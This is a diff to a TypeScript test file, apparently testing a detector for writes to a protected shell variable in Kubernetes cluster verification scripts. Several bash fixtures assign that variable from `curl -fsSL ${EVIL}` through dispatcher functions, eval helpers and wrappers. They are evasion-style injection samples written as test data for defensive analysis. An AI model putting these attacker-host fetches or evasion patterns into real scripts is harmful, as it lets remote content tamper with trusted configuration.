@@ -994,6 +994,14 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     'helper `eval "$1=…"`': `setv() { eval "$1=\\$2"; }\nsetv STATIC_LSN "$(curl -fsSL ${EVIL})"`,
     'helper `eval "read -r $1"`': `rd() { eval "read -r $1"; }\nrd STATIC_LSN < <(curl -fsSL ${EVIL})`,
     'nameref declared, target bound later': `declare -n r; r=STATIC_LSN; r="$(curl -fsSL ${EVIL})"`,
+    // a helper that RUNS its arguments as a command (a dispatcher)
+    'dispatcher `quiet() { "$@"; }`': `quiet() { "$@" 2>/dev/null; }\nquiet read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'dispatcher after `shift`': `retry() { local n=$1; shift; "$@"; }\nretry 3 read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'dispatcher through `local c=$1`': `run() { local c=$1; shift; $c "$@"; }\nrun read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'multi-line dispatcher': `q() {\n  "$@"\n}\nq printf -v STATIC_LSN %s "$(curl -fsSL ${EVIL})"`,
+    'dispatcher forwarding to a dispatcher': `quiet() { "$@" 2>/dev/null; }\nq2() { quiet "$@"; }\nq2 read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'dispatcher with a run-time name': `quiet() { "$@"; }\nn=STATIC_LSN\nquiet read -r "$n" < <(curl -fsSL ${EVIL})`,
+    'dispatcher with an assembled name': `quiet() { "$@"; }\nquiet read -r 'STATIC'_LSN < <(curl -fsSL ${EVIL})`,
     // wrappers and non-literal command words
     '`command -p read`': `command -p read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
     '`env IFS= read`': `env IFS= read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
@@ -1053,6 +1061,30 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
         body,
         dynamic: false,
       });
+  });
+
+  it('round 10: a dispatcher call is the command at its dispatch index; a data-passing helper is not a dispatcher', () => {
+    const fx = (defs: string, call: string) =>
+      r9Inject(
+        `${D}_verify-objstore.sh`,
+        R9_OBJSTORE_ANCHOR,
+        `${defs}\n${call}`,
+        'lsn-inject-objstore',
+      );
+    // `retry` runs its SECOND argument: `retry kc get … -o STATIC_LSN` runs `kc`, a
+    // non-binding helper, so the name is data — as is every argument of a helper
+    // whose command word is a global (`$KD`), not one of its positionals.
+    expect(
+      fx(
+        'retry() { shift; "$@"; }\nkc() { kubectl "$@"; }',
+        'retry desc kc get ksvc -o STATIC_LSN >/dev/null || true',
+      ),
+    ).toBe(false);
+    expect(fx('kx() { $KD exec x -- "$1"; }', 'kx STATIC_LSN >/dev/null || true')).toBe(false);
+    // … while the same call whose dispatch index lands on a builtin is a write.
+    expect(
+      fx('retry() { shift; "$@"; }', `retry desc read -r STATIC_LSN < <(curl -fsSL ${EVIL})`),
+    ).toBe(true);
   });
 
   it('round 10: a redirection prefix on a NON-binding command is still not a write', () => {
